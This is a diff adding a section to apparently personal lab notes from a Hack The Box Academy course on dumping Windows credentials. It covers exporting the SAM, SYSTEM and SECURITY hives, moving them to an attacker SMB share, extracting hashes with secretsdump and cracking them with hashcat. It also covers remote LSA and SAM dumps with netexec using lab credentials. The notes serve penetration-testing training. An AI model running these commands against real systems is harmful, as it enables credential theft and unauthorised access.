@@ -840,3 +840,125 @@ Compromising `NTDS.dit` effectively exposes all domain credentials, making Domai
 
 ### Attacking SAM, SYSTEM, and SECURITY
 
+With administrative access to a Windows system, a common first step is to dump registry hives associated with the SAM database and perform offline credential extraction.
+
+Three registry hives are of primary interest:
+
+- `HKLM\SAM`
+  - Stores local account password hashes.
+- `HKLM\SYSTEM`
+  - Contains the system boot key required to decrypt the SAM database.
+- `HKLM\SECURITY`
+  - Stores LSA-related secrets, including cached credentials, DPAPI keys, and service account passwords.
+
+Launch `cmd.exe` or PowerShell with administrative privileges and use `reg.exe` to export the hives:
+
+```powershell
+reg.exe save hklm\sam C:\sam.save
+reg.exe save hklm\system C:\system.save
+reg.exe save hklm\security C:\security.save
+```
+
+![Filtered output](./.images/save-registry.PNG)
+
+**Transferring Registry Hives**
+
+Next, set up an SMB server on the attacker machine and transfer the exported files.
+
+Create an SMB share named `RegistryData` pointing to a local directory:
+
+```bash
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support RegistryData /home/htb-ac-681215/Desktop
+```
+
+From the compromised Windows host, move the hive files to the SMB share:
+
+```powershell
+move sam.save \\10.10.14.51\RegistryData
+move security.save \\10.10.14.51\RegistryData
+move system.save \\10.10.14.51\RegistryData
+```
+
+![Filtered output](./.images/move-registry-data.PNG)
+
+The files are now available on the attacker system:
+
+![Filtered output](./.images/registry-transfered.PNG)
+
+**Dumping Offline Hashes**
+
+Impacket’s `secretsdump` can extract credentials from the saved registry hives:
+
+```bash
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+```
+
+![Filtered output](./.images/dumping-sam-hashes.PNG)
+
+The output format is:
+
+- `uid:rid:lmhash:nthash`
+
+Modern Windows systems primarily store `NT` hashes. Legacy systems may also contain `LM` hashes, which are significantly weaker and easier to crack.
+
+Extract the `NT` hashes into a separate file:
+
+![Filtered output](./.images/hashes.PNG)
+
+Crack the hashes using Hashcat. `NT` hashes correspond to mode `1000`:
+
+```bash
+hashcat -a 0 -m 1000 hashes.txt rockyou.txt
+```
+
+Successfully cracked hashes:
+
+```
+a3ecf31e65208382e23b3420a34208fc:mommy1
+c02478537b9727d391bc80011c2e2321:matrix
+58a478135a93ac3bf058a5ea0e8fdb71:Password123
+```
+
+![Filtered output](./.images/hashes-cracked.PNG)
+
+**DPAPI and LSA Secrets**
+
+In addition to SAM hashes, `secretsdump` also extracts machine and user keys related to **DPAPI** from `HKLM\SECURITY`.
+
+The **Data Protection API (DPAPI)** encrypts sensitive data on a per-user basis and is used by many Windows components and third-party applications, including:
+
+- Internet Explorer
+- Google Chrome
+- Outlook
+- Remote Desktop Connection
+- Credential Manager
+
+DPAPI blobs can be decrypted using tools such as
+
+- Impackets `dpapi`
+- `mimikatz`
+- `DonPAPI`
+
+**Remote SAM and LSA Dumping**
+
+If valid local administrator credentials are available, SAM and LSA secrets can also be extracted remotely without manually copying registry hives.
+
+Dump LSA secrets:
+
+```bash
+netexec smb 10.129.202.137 --local-auth -u Bob -p HTB_@cademy_stdnt! --lsa
+```
+
+![Filtered output](./.images/lsa-remote-dump.PNG)
+
+Dump SAM hashes:
+
+```bash
+netexec smb 10.129.202.137 --local-auth -u Bob -p HTB_@cademy_stdnt! --sam
+```
+
+![Filtered output](./.images/sam-remote-dump.PNG)
+
+The remotely extracted data matches what was obtained via offline hive dumping, demonstrating a faster alternative once administrative credentials are available.
+
+---
